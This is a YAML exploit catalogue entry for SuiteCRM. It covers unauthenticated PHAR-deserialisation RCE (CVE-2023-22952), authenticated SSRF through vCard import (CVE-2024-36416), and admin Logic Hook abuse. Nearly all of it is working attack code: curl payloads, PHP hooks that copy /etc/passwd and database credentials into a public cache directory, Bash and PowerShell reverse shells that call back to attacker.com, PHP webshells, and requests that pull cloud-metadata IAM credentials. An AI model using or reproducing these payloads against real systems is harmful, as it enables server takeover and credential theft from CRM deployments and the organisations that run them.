---
comment: "SuiteCRM is an open-source PHP CRM (fork of SugarCRM) widely deployed on-premise.\n\
  \nCVE-2023-22952 (CVSS 9.8): Unauthenticated RCE in SuiteCRM < 7.12.8 and < 8.2.0.\n\
  The vulnerability exists in the email-based Forgot Password flow: the `email`\n\
  parameter is processed without adequate sanitisation, allowing an attacker to inject\n\
  a PHAR:// stream wrapper URI. PHP's PHAR extension deserialises the archive metadata\n\
  using available SuiteCRM gadget classes, achieving arbitrary code execution as the\n\
  web server user (commonly www-data or apache). Some public writeups describe an\n\
  overlapping code path via the UploadFile entry point \u2014 the precise trigger\
  \ point\nvaries across minor releases; the net result is unauthenticated RCE in\
  \ all affected\nversions. Ref: https://www.exploit-db.com/exploits/51114 / nuclei:\
  \ CVE-2023-22952\n\nCVE-2024-36416 (CVSS 8.8): Authenticated SSRF in SuiteCRM <\
  \ 7.14.4. The vCard\nimport feature fetches a user-supplied URL server-side without\
  \ restricting targets,\nallowing any authenticated user to probe internal services\
  \ and cloud metadata endpoints.\n\nAdmin-level: SuiteCRM's Studio module and Logic\
  \ Hook mechanism allow administrators\nto execute arbitrary PHP on CRM events. Logic\
  \ Hooks are PHP files placed in\ncustom/Extension/modules/<Module>/Ext/LogicHooks/\
  \ and invoked automatically on\nrecord save, delete, and other lifecycle events.\
  \ No restart is required.\n"
functions:
  file-read:
  - code: |
      <?php
      // Admin Logic Hook file read: place in custom/Extension/modules/Contacts/Ext/LogicHooks/read_hook.php
      function read_hook($bean, $event, $arguments) {
          $content = file_get_contents('/etc/passwd');
          file_put_contents(SUGAR_BASE_DIR . '/cache/out.txt', $content);
      }
      ?>
    comment: |
      Admin Logic Hook file read: the hook reads an arbitrary server-side file and
      writes its content to the publicly accessible cache directory.
      Fetch the result at: http://victim.com/cache/out.txt
      Key targets: /etc/passwd, SuiteCRM config files (config.php, config_override.php)
      which contain the database credentials in plaintext.
    contexts:
      admin:
  rce:
  - code: |
      # CVE-2023-22952: Unauthenticated RCE via PHAR deserialization in the Forgot Password flow
      # Step 1: craft a PHAR archive containing a serialized SuiteCRM gadget chain payload
      # Step 2: host the PHAR at http://attacker.com/evil.phar
      # Step 3: trigger PHAR deserialization via the email parameter

      curl -s -X POST "http://victim.com/index.php?entryPoint=forgotPassword" \
        --data-urlencode "email=phar://path/to/evil.phar/test"

      # Alternatively, use the public PoC which automates gadget chain construction:
      # python3 51114.py http://victim.com attacker.com 12345
      # Ref: https://www.exploit-db.com/exploits/51114
    comment: |
      CVE-2023-22952: The SuiteCRM Forgot Password endpoint passes the user-supplied
      email value into a PHP stream wrapper context without sanitisation. Injecting a
      phar:// URI causes PHP to deserialize the PHAR archive metadata using SuiteCRM's
      own classes as a gadget chain, achieving RCE as the web server user.
      The exact code path differs between 7.x and 8.x branches; in both cases the
      end result is unauthenticated PHP deserialization leading to OS command execution.
      nuclei: CVE-2023-22952
      Ref: https://www.exploit-db.com/exploits/51114
    contexts:
      unauthenticated:
    version: |
      < 7.12.8 / < 8.2.0
  - code: |
      <?php
      // Admin Logic Hook: place in custom/Extension/modules/Contacts/Ext/LogicHooks/rce_hook.php
      // Then add the hook registration in custom/modules/Contacts/logic_hooks.php

      // hook file content (rce_hook.php):
      function rce_hook($bean, $event, $arguments) {
          $output = shell_exec($_GET['c'] ?? 'id');
          file_put_contents('/tmp/rce_out.txt', $output);
      }
      ?>
    comment: |
      Admin Logic Hook RCE: SuiteCRM executes PHP files registered as Logic Hooks on
      module lifecycle events (save, delete, after_retrieve, etc.). An admin can place
      arbitrary PHP in custom/Extension/modules/<Module>/Ext/LogicHooks/ and register
      it in the module's logic_hooks.php. The hook fires server-side on the next
      matching event (e.g., saving any Contact record) without requiring a server restart.
      Navigate to Admin > Repair > Quick Repair and Rebuild to load the new hook file.
      This is documented as expected admin functionality, not a CVE.
    contexts:
      admin:
  reverse-shell:
  - blind: true
    code: |
      # CVE-2023-22952: unauthenticated reverse shell via PHAR deserialization
      # Use the public PoC (EDB-51114) which builds the PHAR gadget chain and
      # triggers the deserialization automatically:
      # python3 51114.py http://victim.com attacker.com 12345
      #
      # Manual alternative: craft a PHAR containing a __destruct gadget that calls:
      bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1'
    comment: |
      CVE-2023-22952: reverse shell via PHAR deserialization in the Forgot Password flow.
      The PHP gadget chain's __destruct method is used to execute a bash reverse shell
      payload. The connection back to the attacker arrives before the HTTP response
      completes. Runs as the web server user (commonly www-data).
      Ref: https://www.exploit-db.com/exploits/51114
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |
      < 7.12.8 / < 8.2.0
  - blind: true
    code: |
      <?php
      // Admin Logic Hook reverse shell (Linux)
      // Place in custom/Extension/modules/Contacts/Ext/LogicHooks/revshell_hook.php
      function revshell_hook($bean, $event, $arguments) {
          exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &");
      }
      ?>
    comment: |
      Admin Logic Hook reverse shell for Linux: runs on the next matching CRM event
      (e.g., saving any Contact). The exec() call is fire-and-forget with a trailing &
      so the HTTP response completes normally. Check the listener for the incoming
      connection. Register the hook and trigger with Admin > Repair > Quick Repair and
      Rebuild, then save any Contact record.
    contexts:
      admin:
    listener: tcp-server
    platform: linux
    tty: false
  - blind: true
    code: |
      <?php
      // Admin Logic Hook reverse shell (Windows)
      // Place in custom/Extension/modules/Contacts/Ext/LogicHooks/revshell_hook.php
      function revshell_hook($bean, $event, $arguments) {
          $ps = '$c=New-Object Net.Sockets.TCPClient("attacker.com",12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}';
          $cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "' . $ps . '"';
          popen($cmd, 'r');
      }
      ?>
    comment: |
      Windows variant: Admin Logic Hook that spawns a PowerShell reverse shell on the
      next matching CRM lifecycle event. Uses popen() to launch PowerShell detached
      from the PHP process. Register and trigger the same way as the Linux variant.
    contexts:
      admin:
    listener: tcp-server
    platform: windows
    tty: false
  ssrf:
  - code: |
      # CVE-2024-36416: authenticated SSRF via vCard import URL fetch
      # Step 1: log in with any valid account (admin or standard user)
      curl -s -c /tmp/sc.jar -X POST "http://victim.com/index.php" \
        -d "module=Users&action=Authenticate&user_name=admin&user_password=admin&return_url=%2Findex.php"

      # Step 2: trigger the SSRF by submitting a vCard import with an internal URL
      curl -s -b /tmp/sc.jar -X POST "http://victim.com/index.php?module=Contacts&action=ImportVCard" \
        -F "vcard_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

      # Target cloud metadata endpoints:
      # AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
      # GCP:        http://metadata.google.internal/computeMetadata/v1/
      # Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
    comment: |
      CVE-2024-36416: SuiteCRM's vCard import feature fetches a user-supplied URL
      server-side without restricting targets to external or safe addresses. Any
      authenticated user can point the vcard_url parameter to an internal service
      or cloud metadata endpoint. The response content may be reflected in error
      messages or logged, leaking internal network information.
      nuclei: CVE-2024-36416
    contexts:
      authenticated:
    version: |
      < 7.14.4
  - code: "# Admin SSRF via outbound email test (SMTP connection probe)\n# Navigate\
      \ to Admin > Email Settings and set the SMTP host to an internal target:\n#\
      \ SMTP Server: 169.254.169.254  Port: 80\n# Click \"Send Test Email\" \u2014\
      \ SuiteCRM will attempt a TCP connection to the address,\n# and the error message\
      \ will reveal whether the port is open (connection refused vs timeout).\n"
    comment: "Admin-level semi-blind SSRF via the outbound SMTP configuration test.\
      \ SuiteCRM\nattempts to connect to the configured SMTP host and port when \"\
      Send Test Email\"\nis clicked in Admin > Email Settings. The resulting error\
      \ message differs between\nopen and closed/filtered ports, enabling internal\
      \ network port scanning.\nNo CVE assigned \u2014 this is a common pattern across\
      \ web applications with configurable\noutbound email settings.\n"
    contexts:
      admin:
  webshell:
  - code: |
      # CVE-2023-22952: drop a PHP webshell via the PHAR gadget chain
      # Craft a PHAR whose gadget chain writes a webshell to the SuiteCRM webroot:
      # file_put_contents('/var/www/html/suitecrm/shell.php', '<?php system($_GET["c"]); ?>');
      #
      # Trigger deserialization via the Forgot Password endpoint:
      curl -s -X POST "http://victim.com/index.php?entryPoint=forgotPassword" \
        --data-urlencode "email=phar://path/to/evil.phar/test"
      #
      # Access the dropped webshell:
      curl "http://victim.com/shell.php?c=id"
    comment: |
      CVE-2023-22952: the PHAR gadget chain can be used to write a PHP webshell to the
      SuiteCRM document root instead of (or in addition to) spawning a shell. Adjust
      the target path to the actual webroot of the installation.
      Common paths: /var/www/html/suitecrm/, /opt/bitnami/suitecrm/
    contexts:
      unauthenticated:
    version: |
      < 7.12.8 / < 8.2.0
  - code: |
      <?php
      // Admin Logic Hook webshell: place in custom/Extension/modules/Contacts/Ext/LogicHooks/ws_hook.php
      function ws_hook($bean, $event, $arguments) {
          $shell = SUGAR_BASE_DIR . '/cache/shell.php';
          if (!file_exists($shell)) {
              file_put_contents($shell, '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>');
          }
      }
      ?>
    comment: |
      Admin Logic Hook webshell: on the first matching CRM event the hook writes a PHP
      webshell to the SuiteCRM cache directory (publicly accessible under the webroot).
      Access at: http://victim.com/cache/shell.php?c=id
      SUGAR_BASE_DIR resolves to the SuiteCRM installation root at runtime.
    contexts:
      admin:
...
